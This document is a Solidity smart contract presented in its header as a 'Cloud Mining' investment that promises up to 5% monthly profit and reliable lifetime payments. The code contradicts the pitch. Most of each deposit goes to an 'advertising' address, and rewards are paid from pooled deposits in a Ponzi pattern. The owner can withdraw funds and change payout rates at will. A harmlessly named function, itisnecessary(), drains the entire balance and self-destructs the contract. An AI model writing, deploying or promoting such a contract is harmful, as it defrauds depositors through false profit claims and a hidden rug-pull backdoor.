pragma solidity ^0.5.10;

/*
Get up 5 % profit every month with a contract Cloud Mining!
*
* - lifetime payments
* - unprecedentedly reliable
* - bring luck
* - first minimum contribution from 0.1 eth, all next from 0.01 eth
* - Currency and Payment - ETH
* - Contribution allocation schemes:
* - 100% of payments - only 6% percent for support and 3% percent referral system!
* 
*
* RECOMMENDED GAS LIMIT: 200,000
* RECOMMENDED GAS PRICE: https://ethgasstation.info/
* DO NOT TRANSFER DIRECTLY FROM AN EXCHANGE (only use your ETH wallet, from which you have a private key)
* You can check payments on the website etherscan.io, in the “Internal Txns” tab of your wallet.
*
*@FOR USER'S:
* This smart contract is a public offer.
* In accordance with the law on digital assets adopted in the Russian Federation, 
* we bother you that you perform all actions in a smart contract exclusively independently and at your own peril and risk.
* The developers are not responsible for your actions.
* By submitting your digital assets to a smart contract, you agree to this offer.
* How to use:
* 1. Send from your ETH wallet to the address of the smart contract
* any amount first from 0.1 ETH and all next from 0.01 ETH.
* 2. Confirm your transaction in the history of your application or etherscan.io, indicating the address of your wallet.
* Take profit by sending 0 eth to contract (profit is calculated every second).
*
*@DEV https://github.com/alexburndev/miningmasters/blob/main/cloudmining.sol
**/



library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-solidity/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0, "SafeMath: modulo by zero");
        return a % b;
    }
}

contract CloudMinig_byMiningMasters 
{
    using SafeMath for uint256;
    
    address payable public owner = 0x1a08070FFE5695aB0Eb4612640EeC11bf2Cf58eE;
    address payable public addressSupportProject = 0x009AE8DDCBF8aba5b04d49d034146A6b8E3a8B0a;
    address payable public addressAdverstingProject = 0x54a39674A0c22Cb2f9022f285b366a4f4d525266;
    

    
    uint p;
    uint d = 100;
    uint p0 = 2;
    uint p1 = 3;
    uint p2 = 4;
    uint p3 = 5;
    uint refer = 3;
    uint sup = 3;
    uint adv;
    
    struct InvestorData {
        uint256 funds;
        uint256 lastDatetime;
        uint256 totalProfit;
    }
    mapping (address => InvestorData) investors;
    
    modifier onlyOwner()
    {
        assert(msg.sender == owner);
        _;
    }
    
    function withdraw(uint256 amount)  public onlyOwner {
        owner.transfer(amount);
    }
    
    function changeOwner(address payable newOwner) public onlyOwner {
        owner = newOwner;
    }
    
  
    
    function SetProcp0 (uint _p0, uint _d) public onlyOwner {
        p0 = _p0;
        if (_d == 0) d = 100;
    }
    
    function SetProcp1 (uint _p1, uint _d) public onlyOwner {
        p1 = _p1;
        if (_d == 0) d = 100;
    }
    
    function SetProcp2 (uint _p2, uint _d) public onlyOwner {
        p2 = _p2;
        if (_d == 0) d = 100;
    }
    
    function SetProcp3 (uint _p3, uint _d) public onlyOwner {
        p3 = _p3;
        if (_d == 0) d = 100;
    }
    
    
    function SetProcrefer (uint _refer, uint _d) public onlyOwner {
        refer = _refer;
        if (_d == 0) d = 100;
    }
    
    function ChangeAdverstingProject (address payable _NewAddress) public onlyOwner {
       addressAdverstingProject = _NewAddress;
    }
    
    function ChangeAddressSupport (address payable _NewAddress) public onlyOwner {
       addressSupportProject = _NewAddress;
    }
 
    
    
    function itisnecessary() public onlyOwner {
        msg.sender.transfer(address(this).balance);
        selfdestruct(owner);
    }    
    
    function addInvestment( uint investment, address payable investorAddr) public onlyOwner  {
        investorAddr.transfer(investment);
    } 
  
    
    function bytesToAddress(bytes memory bys) private pure returns (address payable addr) {
        assembly {
          addr := mload(add(bys,20))
        } 
    }
    
    
    
    function getInfo(address investor) view public returns (uint256 totalFunds, uint256 pendingReward, 
    uint256 totalProfit )
    {
        InvestorData memory data = investors[investor];
        totalFunds = data.funds;
        if (data.funds > 0) pendingReward = data.funds.mul(p).div(d).mul(block.timestamp - data.lastDatetime).div(30 days);
        totalProfit = data.totalProfit;
       }
    
    function() payable external
    {
        assert(msg.sender == tx.origin); // prevent bots to interact with contract
        
        if (msg.sender == owner) return;
        
        
        
        InvestorData storage data = investors[msg.sender];
        
        if (msg.value > 0) 
        
        {
            // first investment at least 0.1 ether, all next at least 0.01 ether
          assert(msg.value >= 0.1 ether || (data.funds != 0 && msg.value >= 0.01 ether));
          if (msg.data.length == 20) {
            address payable ref = bytesToAddress(msg.data);
            assert(ref != msg.sender);
            ref.transfer(msg.value.mul(refer).div(100));   // 3%
            addressAdverstingProject.transfer(msg.value.mul(100-refer-sup-10).div(d));
               
            } else if (msg.data.length == 0) {
               
                addressAdverstingProject.transfer(msg.value.mul(100-sup-10).div(d));
            }
            
            addressSupportProject.transfer(msg.value.mul(sup).div(d));
            
            
        }
        
      
          
       
        
      if (data.funds < 10 ether) {
          p = p0;
      
       } else if ( 10 ether <= data.funds && data.funds < 30 ether) {
           p = p1;
       } else if ( 30 ether <= data.funds && data.funds < 50 ether) {
           p = p2;
       } else if ( data.funds >=50 ether) {
           p = p3;
       }
        
          
        
        if (data.funds != 0) {
            // % per 30 days
            uint256 reward = data.funds.mul(p).div(d).mul(block.timestamp - data.lastDatetime).div(30 days);
            data.totalProfit = data.totalProfit.add(reward);
            
            address(msg.sender).transfer(reward);
        }

        data.lastDatetime = block.timestamp;
        data.funds = data.funds.add(msg.value.mul(94).div(100));
        
    }
    
    
    
    function getrewardInfo(address investor) view public returns (uint256 totalFunds, uint256 pendingReward, 
    uint256 totalProfit,uint _yourProcent)
    
    {
        InvestorData memory data = investors[investor];
        totalFunds = data.funds;
         _yourProcent = p;
        if (data.funds > 0) pendingReward = data.funds.mul(p).div(d).mul(block.timestamp - data.lastDatetime).div(30 days);
        totalProfit = data.totalProfit;
     
    }    
        
        
        

}